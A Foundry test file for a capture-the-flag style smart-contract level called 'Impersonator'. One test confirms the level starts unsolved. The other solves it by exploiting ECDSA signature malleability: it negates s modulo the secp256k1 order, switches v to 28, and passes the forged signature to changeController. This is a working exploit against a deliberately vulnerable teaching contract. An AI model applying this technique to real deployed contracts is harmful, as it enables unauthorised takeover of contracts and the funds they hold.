pragma solidity ^0.8.0;

import "src/levels/Impersonator/ImpersonatorFactory.sol";
import "src/levels/Impersonator/Impersonator.sol";
import "forge-std/Test.sol";

contract ImpersonatorAttackTest is Test {
    address public dummyPlayerAddress = 0x4E785DCC3b950F0F6779E60Bae28A48E9aEB4C9A;
    ImpersonatorFactory public factory;
    Impersonator public instance;

    function setUp() public {
        factory = new ImpersonatorFactory();
        instance = Impersonator(payable(factory.createInstance(dummyPlayerAddress)));
    }

    function test_ShouldNotBeImmediatelySolvable() public {
        assertEq(factory.validateInstance(payable(address(instance)), dummyPlayerAddress), false);
    }

    function test_ShouldAllowThePlayerToSolveTheLevel() public {
        bytes32 r = bytes32(uint256(11397568185806560130291530949248708355673262872727946990834312389557386886033));
        bytes32 s = bytes32(uint256(54405834204020870944342294544757609285398723182661749830189277079337680158706));

        vm.startPrank(dummyPlayerAddress, dummyPlayerAddress);
        uint256 secp256k1_n = 115792089237316195423570985008687907852837564279074904382605163141518161494337;
        bytes32 tricked_s = bytes32(secp256k1_n - uint256(s));

        ECLocker locker0 = instance.lockers(0);
        locker0.changeController(28, r, tricked_s, address(0));

        assertEq(factory.validateInstance(payable(address(instance)), dummyPlayerAddress), true);
    }
}
